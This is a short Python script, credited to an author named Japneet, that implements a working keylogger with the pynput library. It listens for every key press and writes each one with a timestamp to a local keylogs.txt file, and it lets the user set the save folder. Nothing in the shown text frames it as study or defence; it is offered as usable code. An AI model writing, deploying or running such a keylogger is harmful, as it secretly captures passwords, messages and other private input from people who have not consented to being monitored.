#This code was written by Japneet on 6th March, 2022. Thank you for reading.

from pynput.keyboard import Key, Listener
import logging

varset = "" #leave this blank if you want to save the keystrokes in the same folder

logging.basicConfig(filename=(varset + "keylogs.txt"),level=logging.DEBUG, format='%(asctime)s: %(message)s') #format

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()